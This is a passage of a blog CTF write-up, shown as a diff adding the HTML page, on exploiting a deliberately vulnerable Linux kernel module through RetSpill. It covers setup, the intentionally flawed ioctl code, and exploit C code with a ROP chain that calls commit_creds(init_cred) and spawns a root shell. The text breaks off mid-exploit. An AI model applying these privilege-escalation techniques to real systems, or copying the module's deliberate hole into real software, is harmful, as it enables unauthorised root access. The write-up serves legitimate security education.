@@ -1,0 +1,753 @@
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SpillMe — Zereza's Blog</title>
+  <meta name="description" content="Blog de ciberseguridad. Writeups, notas técnicas e investigación.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='8' fill='%230E1120'/><circle cx='16' cy='16' r='6' fill='none' stroke='%237EC8E3' stroke-width='2'/><circle cx='16' cy='16' r='2' fill='%237EC8E3'/></svg>">
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>SpillMe | Zereza’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="SpillMe" />
+<meta name="author" content="Miguel Peñaranda" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://0.0.0.0:4000/en/challenges/spillme/" />
+<meta property="og:url" content="http://0.0.0.0:4000/en/challenges/spillme/" />
+<meta property="og:site_name" content="Zereza’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-03-31T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SpillMe" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Miguel Peñaranda"},"dateModified":"2026-03-31T00:00:00+02:00","datePublished":"2026-03-31T00:00:00+02:00","description":"Introduction","headline":"SpillMe","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/en/challenges/spillme/"},"url":"http://0.0.0.0:4000/en/challenges/spillme/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav__inner">
+    <a href="/en/" class="nav__logo">
+      <span class="nav__logo-dot"></span>
+      Zereza's Blog
+    </a>
+    <ul class="nav__links" id="nav-links">
+      <li><a href="/en/" >home</a></li>
+      <li><a href="/en/about/" >whoami</a></li>
+      <li><a href="/en/posts/" >posts</a></li>
+      <li><a href="/en/challenges/" class="active">challenges</a></li>
+    </ul>
+    <div class="nav__tools">
+      <div class="lang-switch" aria-label="Language switcher">
+        <a href="/challenges/spillme/" >ES</a>
+        <a href="/en/challenges/spillme/" class="active">EN</a>
+      </div>
+      <a href="https://github.com/mzereza" target="_blank" rel="noopener" class="nav__cta">github ↗</a>
+    </div>
+    <button class="nav__burger" onclick="document.getElementById('nav-links').classList.toggle('open')">≡</button>
+  </div>
+</nav>
+
+<main>
+
+
+<div class="page page--with-toc">
+  <aside class="toc-sidebar" id="toc-sidebar">
+    <div class="toc-sidebar__inner">
+      <span class="toc-sidebar__title">Contents</span>
+      <nav class="toc-nav" id="toc-nav"></nav>
+    </div>
+  </aside>
+
+  <article class="post-wrap">
+
+    <a href="/en/challenges/" class="post-back">← volver a challenges</a>
+
+    <header class="post-header">
+      <div class="post-header-tags">
+        
+      </div>
+      <h1>SpillMe</h1>
+      <div class="post-header-meta">
+        
+        <span>March 31, 2026</span>
+        
+        
+      </div>
+    </header>
+
+    
+
+    <div class="prose" id="prose-content">
+      <h2 id="introduction">Introduction</h2>
+
+<p>In this challenge we are provided with the zip <a href="/assets/scripts/spillme/SpillMe.zip"><strong>SpillMe.zip</strong></a> containing the following files:</p>
+<ul>
+  <li>A compressed kernel image: <strong>bzImage</strong></li>
+  <li>A compressed filesystem: <strong>rootfs.cpio.gz</strong></li>
+  <li>A script to start qemu: <strong>run.sh</strong></li>
+  <li>A kernel module source code: <strong>vuln.c</strong></li>
+</ul>
+
+<h2 id="environment-setup">Environment Setup</h2>
+
+<h3 id="the-linux-kernel">The Linux Kernel</h3>
+
+<p>The first thing we’ll do is decompress the <strong>bzImage</strong> to get the <strong>Linux Kernel</strong> image. I’ll use the script <a href="/assets/scripts/spillme/extract-image.sh">extract-image.sh</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>./extract-image.sh ./bzImage <span class="o">&gt;</span> vmlinux
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We do this to be able to debug later, and to find <strong>ROP gadgets</strong>. To find <strong>gadgets</strong> in <strong>Kernel</strong> images I use this tool: <a href="https://github.com/zolutal/kropr">kropr</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>kropr vmlinux <span class="o">&gt;</span> GADGETS.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="the-filesystem">The Filesystem</h3>
+
+<p>To decompress the filesystem we’ll run the following commands:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="nb">mkdir </span>rootfs
+<span class="nb">cd </span>rootfs
+<span class="nb">cp</span> ../rootfs.cpio.gz <span class="nb">.</span>
+<span class="nb">gunzip</span> <span class="nt">-c</span> rootfs.cpio.gz | cpio <span class="nt">-i</span>
+<span class="nb">rm </span>rootfs.cpio.gz
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>In the root we find the <strong>init</strong> script. For later <strong>debugging</strong> purposes we’ll modify one line of the script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="c">#setsid cttyhack setuidgid 1000 /bin/sh</span>
+setsid cttyhack setuidgid 0 /bin/sh
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>With this we’ll make the system start us as the <strong>root</strong> user.</p>
+
+<blockquote>
+  <p>When we go to test our exploit we must change this back to 1000 to see if we’ve actually escalated privileges, and avoid false positives.</p>
+</blockquote>
+
+<p>To compress the filesystem again along with our exploit I used the following script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>
+<span class="nb">set</span> <span class="nt">-e</span>
+
+gcc <span class="nt">-o</span> rootfs/exploit <span class="nt">-static</span> exploit.c
+<span class="nb">chmod</span> +x rootfs/exploit
+
+<span class="nb">cd </span>rootfs
+
+find <span class="nb">.</span> | cpio <span class="nt">-ov</span> <span class="nt">--format</span><span class="o">=</span>newc | <span class="nb">gzip</span> <span class="nt">-9</span> <span class="o">&gt;</span> ../rootfs.cpio.gz
+
+<span class="nb">cd</span> ..
+<span class="nb">ls</span> <span class="nt">-lh</span> rootfs.cpio.gz
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="the-qemu-script">The Qemu Script</h3>
+
+<p>The contents of <strong>run.sh</strong> are as follows:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>
+
+qemu-system-x86_64 <span class="se">\</span>
+    <span class="nt">-kernel</span>  bzImage      <span class="se">\</span>
+    <span class="nt">-initrd</span>  rootfs.cpio.gz <span class="se">\</span>
+    <span class="nt">-nographic</span>            <span class="se">\</span>
+    <span class="nt">-monitor</span> /dev/null    <span class="se">\</span>
+    <span class="nt">-append</span> <span class="s2">"console=ttyS0 root=/dev/ram rdinit=/init oops=panic panic=-1 quiet nokaslr"</span> <span class="se">\</span>
+    <span class="nt">-m</span> 128M               <span class="se">\</span>
+    <span class="nt">-smp</span> 2                <span class="se">\</span>
+    <span class="nt">-cpu</span> qemu64,+smep,+smap <span class="se">\</span>
+    <span class="nt">-no-reboot</span>            <span class="se">\</span>
+    <span class="nt">-no-shutdown</span>              
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Some notable flags are:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-kernel</code> specifies the compressed kernel image</li>
+  <li><code class="language-plaintext highlighter-rouge">-initrd</code> specifies the compressed filesystem</li>
+  <li><code class="language-plaintext highlighter-rouge">-append</code> specifies additional <strong>boot</strong> options, here we can see that <code class="language-plaintext highlighter-rouge">KASLR</code> is <strong>disabled</strong>, and <code class="language-plaintext highlighter-rouge">Oops on Panic</code> is <strong>enabled</strong></li>
+  <li><code class="language-plaintext highlighter-rouge">-m</code> specifies the virtual machine memory</li>
+  <li><code class="language-plaintext highlighter-rouge">-cpu</code> specifies the CPU model and some <strong>enabled protections</strong> like <code class="language-plaintext highlighter-rouge">SMAP</code> and <code class="language-plaintext highlighter-rouge">SMEP</code></li>
+</ul>
+
+<p>The first thing we’ll do is add the <code class="language-plaintext highlighter-rouge">-s</code> flag. This option lets us <strong>debug the kernel</strong> from our host machine, opening port <strong>1234</strong>. Simply run the following command in <strong>gdb</strong> once you’ve started the virtual machine:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> target remote :1234
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="analyzing-the-kernel-module">Analyzing the Kernel Module</h2>
+
+<p>Let’s analyze the <strong>vuln.c</strong> code:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/uaccess.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/miscdevice.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/workqueue.h&gt;</span><span class="cp">
+</span>
+<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">"GPL"</span><span class="p">);</span>
+<span class="n">MODULE_AUTHOR</span><span class="p">(</span><span class="s">"Zereza"</span><span class="p">);</span>
+
+<span class="cp">#define VULN_WRITE   0xDEAD0001
+#define VULN_EXEC    0xDEAD0002
+</span>
+<span class="k">static</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fn_ptr</span><span class="p">)(</span><span class="kt">void</span><span class="p">)</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+<span class="k">static</span> <span class="kt">long</span> <span class="nf">vuln_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">switch</span> <span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="k">case</span> <span class="n">VULN_WRITE</span><span class="p">:</span> <span class="p">{</span>
+        <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">)))</span>
+            <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
+        <span class="n">fn_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span><span class="n">addr</span><span class="p">;</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">case</span> <span class="n">VULN_EXEC</span><span class="p">:</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">arg</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">){</span>
+          <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">fn_ptr</span><span class="p">)</span> <span class="n">fn_ptr</span><span class="p">();</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nl">default:</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">int</span>      <span class="nf">vuln_open</span>   <span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">i</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
+<span class="k">static</span> <span class="kt">int</span>      <span class="nf">vuln_release</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">i</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
+
+<span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">vuln_fops</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="p">.</span><span class="n">owner</span>          <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">open</span>           <span class="o">=</span> <span class="n">vuln_open</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">release</span>        <span class="o">=</span> <span class="n">vuln_release</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">unlocked_ioctl</span> <span class="o">=</span> <span class="n">vuln_ioctl</span><span class="p">,</span>
+<span class="p">};</span>
+
+<span class="k">static</span> <span class="k">struct</span> <span class="n">miscdevice</span> <span class="n">vuln_dev</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="p">.</span><span class="n">minor</span> <span class="o">=</span> <span class="n">MISC_DYNAMIC_MINOR</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">name</span>  <span class="o">=</span> <span class="s">"vuln"</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">fops</span>  <span class="o">=</span> <span class="o">&amp;</span><span class="n">vuln_fops</span><span class="p">,</span>
+<span class="p">};</span>
+
+<span class="n">module_misc_device</span><span class="p">(</span><span class="n">vuln_dev</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We can observe the <strong>vuln_ioctl</strong> function which accepts two commands:</p>
+<ol>
+  <li><strong>VULN_WRITE</strong>: Lets us write <strong>8 bytes</strong> into the global variable <strong>fn_ptr</strong></li>
+  <li><strong>VULN_EXEC</strong>: Checks that <strong>arg</strong> is 0 <em>(this is done to prevent register control)</em>, and executes <strong>fn_ptr</strong> as a function</li>
+</ol>
+
+<p><strong>We have Control Flow Hijack (CHF)!</strong> But… <strong>how do we go from this to privilege escalation?</strong></p>
+
+<p>We can execute whatever function we want, but <strong>we don’t have control over the arguments</strong>, so we can’t do <code class="language-plaintext highlighter-rouge">commit_creds(init_cred)</code> or something similar.</p>
+
+<p>We also can’t do a <strong>ret2user</strong> because we have <strong>Supervisor Mode Execution Protection (SMEP)</strong>, which prevents <strong>Userland</strong> pages from being executable from <strong>Kernel mode</strong>.</p>
+
+<p>Furthermore, we don’t have control over registers or write capability to pivot to a <strong>ROP Chain</strong> in a conventional way.</p>
+
+<h2 id="retspill">RetSpill</h2>
+
+<p><strong>RetSpill</strong> allows transforming a <strong>limited CFH in Kernel</strong> into a more powerful primitive by taking advantage of how the kernel manages the stack.</p>
+
+<blockquote>
+  <p>You can find more information about this technique here: <a href="/en/posts/kernel-retspill">RetSpill</a></p>
+</blockquote>
+
+<p>What we achieve with this technique is taking advantage of the fact that when making a <strong>syscall</strong>, the <strong>Kernel</strong> saves the <strong>pt_regs</strong> structure with our <strong>Userland</strong> registers on the <strong>stack</strong>.</p>
+
+<p>We can write our <strong>ROP Chain</strong> in the registers before calling the <strong>syscall</strong> and pivot with an <code class="language-plaintext highlighter-rouge">add rsp, X ; ret</code> gadget.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>The first thing to do is see how far our <strong>ROP Chain</strong> is from the <strong>RSP</strong> at the moment of function execution, and in what order the registers are placed.</p>
+
+<p>To do this I’ll place distinguishable values in the registers and cause a <strong>Kernel Panic</strong>, then I’ll look at the <strong>stack</strong> with <strong>gdb</strong>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#define VULN_WRITE 0xDEAD0001
+#define VULN_EXEC 0xDEAD0002
+</span>
+<span class="kt">void</span> <span class="nf">trigger_retspill</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">){</span>
+  <span class="n">ulong</span> <span class="n">r15</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">r14</span> <span class="o">=</span> <span class="mh">0x4242424242424242</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">r13</span> <span class="o">=</span> <span class="mh">0x4343434343434343</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">r12</span> <span class="o">=</span> <span class="mh">0x4444444444444444</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">r11</span> <span class="o">=</span> <span class="mh">0x4545454545454545</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">r10</span> <span class="o">=</span> <span class="mh">0x4646464646464646</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">r9</span> <span class="o">=</span> <span class="mh">0x4747474747474747</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">r8</span> <span class="o">=</span> <span class="mh">0x4848484848484848</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">rbx</span> <span class="o">=</span> <span class="mh">0x4949494949494949</span><span class="p">;</span>
+
+  <span class="n">ulong</span> <span class="n">rax</span> <span class="o">=</span> <span class="n">SYS_ioctl</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">rdi</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">rsi</span> <span class="o">=</span> <span class="n">VULN_EXEC</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="n">__asm__</span> <span class="k">volatile</span> <span class="p">(</span>
+      <span class="s">"syscall"</span>
+      <span class="o">:</span> <span class="s">"+b"</span><span class="p">(</span><span class="n">rbx</span><span class="p">),</span> <span class="s">"+r"</span><span class="p">(</span><span class="n">r15</span><span class="p">),</span> <span class="s">"+r"</span><span class="p">(</span><span class="n">r14</span><span class="p">),</span> <span class="s">"+r"</span><span class="p">(</span><span class="n">r13</span><span class="p">),</span> <span class="s">"+r"</span><span class="p">(</span><span class="n">r12</span><span class="p">),</span> <span class="s">"+r"</span><span class="p">(</span><span class="n">r10</span><span class="p">),</span> <span class="s">"+r"</span><span class="p">(</span><span class="n">r9</span><span class="p">),</span> <span class="s">"+r"</span><span class="p">(</span><span class="n">r8</span><span class="p">)</span>
+      <span class="o">:</span> <span class="s">"a"</span><span class="p">(</span><span class="n">rax</span><span class="p">),</span> <span class="s">"D"</span><span class="p">(</span><span class="n">rdi</span><span class="p">),</span> <span class="s">"S"</span><span class="p">(</span><span class="n">rsi</span><span class="p">),</span> <span class="s">"d"</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span>
+      <span class="o">:</span> <span class="s">"rcx"</span><span class="p">,</span> <span class="s">"memory"</span>
+      <span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+  <span class="n">ulong</span> <span class="n">fn_ptr</span> <span class="o">=</span> <span class="mh">0xdeadbeefdeadbeef</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/vuln"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"ERROR"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">VULN_WRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fn_ptr</span><span class="p">);</span>
+  <span class="n">trigger_retspill</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/challenges/spillme/kernel_panic.png" alt="Kernel Panic" /></p>
+
+<p>Here we can see that we have no control over the registers.</p>
+
+<p>We observe the <strong>stack</strong> state in <strong>gdb</strong>:</p>
+
+<p><img src="/assets/img/challenges/spillme/debugging.png" alt="Debugging" /></p>
+
+<p><strong>Our Userland registers are there!</strong> The offset from <strong>RSP</strong> to the first register is <code class="language-plaintext highlighter-rouge">0x80</code>.</p>
+
+<blockquote>
+  <p>It’s important to look at where <code class="language-plaintext highlighter-rouge">RSP</code> points during the <strong>Kernel Panic</strong>, not in <strong>gdb</strong>.</p>
+</blockquote>
+
+<p>The next step is to find a gadget of type <code class="language-plaintext highlighter-rouge">add rsp, X ; ret</code> that pivots us to that zone. From the dump that <strong>kropr</strong> gave us earlier we found this <strong>gadget</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>0xffffffff81f8430d: add rsp, 0x78<span class="p">;</span> pop rbx<span class="p">;</span> ret<span class="p">;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<blockquote>
+  <p>Since <strong>Kernel Address Space Layout Randomization (KASLR)</strong> is disabled, this address doesn’t change, same with the rest of the <strong>gadgets</strong> we’ll use in the <strong>ROP Chain</strong>. If this protection were enabled we’d need to get a LEAK.</p>
+</blockquote>
+
+<h3 id="building-the-rop-chain">Building the ROP Chain</h3>
+
+<p>Now that we have the order in which the registers appear on the <strong>stack</strong> and our <strong>gadget</strong> to pivot, let’s build the <strong>ROP Chain</strong>.</p>
+
+<p>Since we’re in <strong>Kernel Mode</strong> we’ll need to make sure to return safely to <strong>Userland</strong> after escalating privileges. Since we don’t have enough space on the <strong>stack</strong> to use a <strong>KPTI Trampoline</strong>, I’ll return using the <strong>Telefork</strong> technique. This technique is based on using <code class="language-plaintext highlighter-rouge">do_sys_fork</code> and <code class="language-plaintext highlighter-rouge">msleep</code> to return to <strong>Userland</strong>. When returning with this technique I got a <code class="language-plaintext highlighter-rouge">SIGSEGV</code>, so I’ll create a handler.</p>
+
+<p>For the <strong>ROP Chain</strong> we’ll do the following:</p>
+
+<p><code class="language-plaintext highlighter-rouge">commit_creds(init_cred); do_sys_fork(); msleep(big_number)</code></p>
+
+<p>And the <strong>ROP Chain</strong> would look like this:</p>
+
+<pre><code class="language-asm">pop rdi; ret
+init_cred
+commit_creds
+pop rdi; ret
+pop rsi; ret
+do_sys_fork
+msleep
+</code></pre>
+
+<p>The final exploit looks like this:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#define VULN_WRITE 0xDEAD0001
+#define VULN_EXEC 0xDEAD0002
+</span>
+<span class="cp">#define ADD_RSP_0X78_POP1_RET 0xffffffff81f8430d
+#define POP_RDI_RET 0xffffffff8229a95d
+#define POP_RSI_RET 0xffffffff8229aa15
+</span>
+<span class="cp">#define COMMIT_CREDS 0xffffffff813357d0
+#define INIT_CRED 0xffffffff82c0f5c0
+#define DO_SYS_FORK 0xffffffff812fc4f0
+#define MSLEEP 0xffffffff813c2e90
+</span>
+<span class="kt">void</span> <span class="nf">get_shell</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">){</span>
+  <span class="k">if</span><span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"UID: 0"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"GETTING SHELL..."</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"UID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">getuid</span><span class="p">());</span>
+  <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">trigger_retspill</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">){</span>
+  <span class="n">ulong</span> <span class="n">r15</span> <span class="o">=</span> <span class="n">POP_RDI_RET</span><span class="p">;</span> <span class="c1">// 1 POS</span>
+  <span class="n">ulong</span> <span class="n">r14</span> <span class="o">=</span> <span class="n">INIT_CRED</span><span class="p">;</span> <span class="c1">// 2 POS</span>
+  <span class="n">ulong</span> <span class="n">r13</span> <span class="o">=</span> <span class="n">COMMIT_CREDS</span><span class="p">;</span> <span class="c1">// 3 POS</span>
+  <span class="n">ulong</span> <span class="n">r12</span> <span class="o">=</span> <span class="n">POP_RDI_RET</span><span class="p">;</span> <span class="c1">// 4 POS</span>
+  <span class="n">ulong</span> <span class="n">rbx</span> <span class="o">=</span> <span class="n">POP_RSI_RET</span><span class="p">;</span> <span class="c1">// 6 POS</span>
+  <span class="n">ulong</span> <span class="n">r10</span> <span class="o">=</span> <span class="n">DO_SYS_FORK</span><span class="p">;</span> <span class="c1">// 8 POS</span>
+  <span class="n">ulong</span> <span class="n">r9</span> <span class="o">=</span> <span class="n">MSLEEP</span><span class="p">;</span> <span class="c1">// 9 POS</span>
